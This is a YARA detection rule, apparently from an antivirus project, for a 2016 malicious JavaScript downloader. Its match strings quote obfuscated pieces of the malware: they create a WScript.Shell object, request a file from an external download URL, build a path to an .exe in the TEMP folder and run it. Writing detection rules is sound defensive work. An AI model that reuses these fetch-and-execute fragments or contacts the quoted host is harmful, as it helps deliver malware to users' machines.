rule sig_20160401_dcf786ff8ae821aa781fd0a6bddc46e2 {
  meta:
    description = "datamaliciousorder - file 20160401_dcf786ff8ae821aa781fd0a6bddc46e2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "944f2c7db5e5ba0d92e913e49e15b414dc191fe1bac20889170122c6a31ddf92"

  strings:
    $s1  = "function UfaDo(CyBwl, NpCti){UbKzz = UbKzz * 1; return CyBwl - NpCti;};" fullword ascii
    $s2  = "var SlHf = function FxcPkh() {return WScript[TwZlo](\"WScript\"+\".Shell\");}(), WpfMjo = 11;" fullword ascii
    $s3  = "JwuZvr[JlNjx](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "if (JwuZvr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HhXkw(){return WhvDxa + \"\";};" fullword ascii
    $s6  = "function KmYmd() {return SlHf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yxl2Ipy24lCFIYRF.ex\" + \"e\";};" fullword ascii
    $s7  = "function TbzUq() {return ((InkQwi == true) && (InkQwi == JueLyb)) ? 1 : UbKzz;};" fullword ascii
    $s8  = "JueLyb = true; " fullword ascii
    $s9  = "var InkQwi = false;" fullword ascii
    $s10 = "function FdyWx(XrgQuw) {var PjXzo = (1, 2, 3, 4, 5, XrgQuw); return PjXzo;};" fullword ascii
    $s11 = "var DdQh = false;" fullword ascii
    $s12 = "return UfaDo(ZtjPcw, SdoSbz);" fullword ascii
    $s13 = "var JueLyb = false;" fullword ascii
    $s14 = "function WvIrb()" fullword ascii
    $s15 = "function AfOq(PcNi){SlHf[\"R\"+\"un\"](PcNi, UbKzz, UbKzz);};" fullword ascii
    $s16 = "function AlRss(){return 23;};" fullword ascii
    $s17 = "var UmjJq = new this[\"Date\"]();" fullword ascii
    $s18 = "function StdExv(){return TwZlo;};" fullword ascii
    $s19 = "}while (HtMq);" fullword ascii
    $s20 = "InkQwi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}